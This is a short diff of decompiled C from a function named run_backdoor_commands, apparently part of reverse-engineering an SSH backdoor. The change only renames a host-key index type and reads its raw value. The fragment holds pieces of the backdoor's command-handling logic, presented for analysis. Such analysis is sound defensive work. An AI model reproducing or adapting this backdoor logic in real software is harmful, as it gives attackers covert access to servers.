@@ -51,7 +51,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   u8 **scratch_ptr;
   uint *header_copy_cursor;
   byte log_hook_flags;
-  _union_110 selected_hostkey_idx;
+  sshd_hostkey_index_t selected_hostkey_idx;
   long hostkey_cursor;
   ulong rsa_payload_bytes;
   ulong payload_data_offset;
@@ -257,7 +257,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                                                   ,(u8 *)&shared_keybuf_or_timespec_lo,ctx);
                         hostkey_cursor = hostkey_cursor + 1;
                       } while (operation_ok == FALSE);
-                      ctx->sshd_host_pubkey_idx = (u32)selected_hostkey_idx;
+                      ctx->sshd_host_pubkey_idx = selected_hostkey_idx.raw_value;
                       if ((command_opcode != 2) || (-1 < (char)encrypted_payload.field0_0x0._0_1_)) {
                         if (loop_idx == 0) {
 LAB_00109a97:
